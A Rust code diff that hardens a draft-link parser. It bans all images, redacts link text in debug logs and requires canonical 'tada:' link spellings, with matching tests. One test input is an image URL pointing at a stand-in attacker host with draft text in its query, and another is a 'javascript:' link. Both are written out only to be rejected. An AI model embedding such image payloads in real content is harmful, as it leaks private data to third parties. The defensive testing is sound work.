@@ -1,5 +1,6 @@
 //! The provenance manifest of a draft (ADR 0051) and the link rules of ADR 0058.
 
+use std::fmt;
 use std::str::FromStr;
 
 use pulldown_cmark::{Event, LinkType, Tag, TagEnd};
@@ -25,7 +26,9 @@ pub struct FactLink {
 }
 
 /// A source link: `[words](tada:source/<source-version-uuid>#<start>-<end>)`.
-#[derive(Debug, Clone, PartialEq, Eq)]
+///
+/// `Debug` hides the text, because logs must not contain document content (ADR 0035).
+#[derive(Clone, PartialEq, Eq)]
 pub struct SourceLink {
     pub source_version_id: Uuid,
     /// The first character of the passage in the source version.
@@ -34,6 +37,17 @@ pub struct SourceLink {
     pub end: u32,
     /// The text of the link in the draft.
     pub text: String,
+}
+
+impl fmt::Debug for SourceLink {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        f.debug_struct("SourceLink")
+            .field("source_version_id", &self.source_version_id)
+            .field("start", &self.start)
+            .field("end", &self.end)
+            .field("text", &"[redacted]")
+            .finish()
+    }
 }
 
 /// A draft that breaks a link rule of ADR 0051 or ADR 0058.
@@ -45,6 +59,8 @@ pub enum DraftError {
     MalformedTadaLink,
     #[error("a link scheme is not allowed")]
     SchemeNotAllowed,
+    #[error("a draft cannot contain images")]
+    ImageNotAllowed,
 }
 
 impl DraftError {
@@ -61,6 +77,7 @@ impl DraftError {
             Self::FactLinkWithText => "fact-link-with-text",
             Self::MalformedTadaLink => "tada-link-malformed",
             Self::SchemeNotAllowed => "scheme-not-allowed",
+            Self::ImageNotAllowed => "image-not-allowed",
         }
     }
 }
@@ -92,13 +109,10 @@ pub fn extract(markdown: &str) -> Result<Manifest, DraftError> {
                 }
             }
             event => {
-                if let Event::Start(Tag::Image {
-                    link_type,
-                    dest_url,
-                    ..
-                }) = &event
-                {
-                    check_image(*link_type, dest_url)?;
+                // A remote image loads when a reviewer opens the draft, so its address could
+                // send draft content to a third party (ADR 0058).
+                if let Event::Start(Tag::Image { .. }) = &event {
+                    return Err(DraftError::ImageNotAllowed);
                 }
                 if let Some(link) = &mut open {
                     link.add_content(&event);
@@ -171,19 +185,12 @@ fn target(link_type: LinkType, destination: &str) -> Result<Target, DraftError> 
     }
     match scheme(destination).as_deref() {
         Some("https" | "mailto") => Ok(Target::External),
-        Some(TADA_SCHEME) => {
-            tada_target(&destination[TADA_SCHEME.len() + 1..]).ok_or(DraftError::MalformedTadaLink)
-        }
+        // Only the canonical form, so that the client can look up a link by its exact text.
+        Some(TADA_SCHEME) => destination
+            .strip_prefix("tada:")
+            .and_then(tada_target)
+            .ok_or(DraftError::MalformedTadaLink),
         _ => Err(DraftError::SchemeNotAllowed),
-    }
-}
-
-/// An image can show only an external target: a `tada:` target is not an image.
-fn check_image(link_type: LinkType, destination: &str) -> Result<(), DraftError> {
-    match target(link_type, destination) {
-        Ok(Target::External) => Ok(()),
-        Ok(_) | Err(DraftError::MalformedTadaLink) => Err(DraftError::SchemeNotAllowed),
-        Err(error) => Err(error),
     }
 }
 
@@ -213,15 +220,17 @@ fn tada_target(path: &str) -> Option<Target> {
     }
 }
 
-/// A UUID in its hyphenated form only, so that each target has one spelling.
+/// A UUID in its lowercase hyphenated form only, so that each target has one spelling.
 fn hyphenated_uuid(text: &str) -> Option<Uuid> {
-    (text.len() == 36).then(|| Uuid::try_parse(text).ok())?
+    let canonical = text.len() == 36 && !text.bytes().any(|b| b.is_ascii_uppercase());
+    canonical.then(|| Uuid::try_parse(text).ok())?
 }
 
-/// A number of ASCII digits only: no sign, no space.
+/// A number of ASCII digits only: no sign, no space and no leading zero.
 fn decimal<T: FromStr>(text: &str) -> Option<T> {
     let digits = !text.is_empty() && text.bytes().all(|b| b.is_ascii_digit());
-    digits.then(|| text.parse().ok())?
+    let canonical = digits && (text == "0" || !text.starts_with('0'));
+    canonical.then(|| text.parse().ok())?
 }
 
 #[cfg(test)]
@@ -340,7 +349,6 @@ mod tests {
             "[Text](relative/path)",
             "[Text](#anchor)",
             "[Text][ref]\n\n[ref]: javascript:alert(1)",
-            "![Bild](http://example.org/a.png)",
             "| a |\n| - |\n| [x](ftp://example.org) |",
         ] {
             assert_eq!(
@@ -356,10 +364,25 @@ mod tests {
     }
 
     #[test]
-    fn an_image_with_a_tada_target_is_rejected() {
-        let markdown = format!("![](tada:fact/{FACT}?v=3)");
-
-        assert_eq!(extract(&markdown), Err(DraftError::SchemeNotAllowed));
+    fn every_image_is_rejected() {
+        for markdown in [
+            "![Logo](https://example.org/logo.png)",
+            "![Bild](http://example.org/a.png)",
+            "![](https://attacker.example/?d=Budget)",
+            &format!("![](tada:fact/{FACT}?v=3)"),
+            "[![Logo](https://example.org/logo.png)](https://example.org)",
+            "![Bild][ref]\n\n[ref]: https://example.org/a.png",
+        ] {
+            assert_eq!(
+                extract(markdown),
+                Err(DraftError::ImageNotAllowed),
+                "{markdown}"
+            );
+        }
+        assert_eq!(
+            DraftError::ImageNotAllowed.entry_code(),
+            "image-not-allowed"
+        );
     }
 
     #[test]
@@ -369,7 +392,6 @@ mod tests {
             "[Mail](mailto:anna@example.org)",
             "<https://example.org>",
             "<anna@example.org>",
-            "![Logo](https://example.org/logo.png)",
         ] {
             assert_eq!(extract(markdown), Ok(Manifest::default()), "{markdown}");
         }
@@ -395,6 +417,15 @@ mod tests {
             format!("tada:source/{SOURCE}#1-99999999999"),
             format!("tada:event/{FACT}"),
             "tada:".to_owned(),
+            // Only the canonical spelling: lowercase scheme and UUID, no leading zeros.
+            format!("TADA:fact/{FACT}?v=3"),
+            format!("Tada:source/{SOURCE}#1-2"),
+            format!("tada:fact/{}?v=3", FACT.to_uppercase()),
+            format!("tada:source/{}#1-2", SOURCE.to_uppercase()),
+            format!("tada:fact/{FACT}?v=03"),
+            format!("tada:source/{SOURCE}#01-2"),
+            format!("tada:source/{SOURCE}#1-02"),
+            format!("tada:source/{SOURCE}#00-2"),
         ] {
             let markdown = format!("[](<{destination}>)");
             assert_eq!(
@@ -407,6 +438,25 @@ mod tests {
             DraftError::MalformedTadaLink.entry_code(),
             "tada-link-malformed"
         );
+    }
+
+    #[test]
+    fn a_passage_can_start_at_zero() {
+        let manifest = extract(&format!("[a](tada:source/{SOURCE}#0-2)")).expect("valid draft");
+
+        assert_eq!(manifest.sources[0].start, 0);
+    }
+
+    #[test]
+    fn debug_hides_the_text_of_a_source_link() {
+        let manifest =
+            extract(&format!("[Budget von Anna](tada:source/{SOURCE}#1-2)")).expect("valid draft");
+
+        let debug = format!("{manifest:?}");
+
+        assert!(!debug.contains("Budget von Anna"), "{debug}");
+        assert!(debug.contains("[redacted]"), "{debug}");
+        assert!(debug.contains(SOURCE), "{debug}");
     }
 
     #[test]
@@ -435,6 +485,7 @@ mod tests {
             DraftError::FactLinkWithText,
             DraftError::MalformedTadaLink,
             DraftError::SchemeNotAllowed,
+            DraftError::ImageNotAllowed,
         ] {
             assert!(DraftError::CODES.contains(&error.code()), "{error:?}");
         }
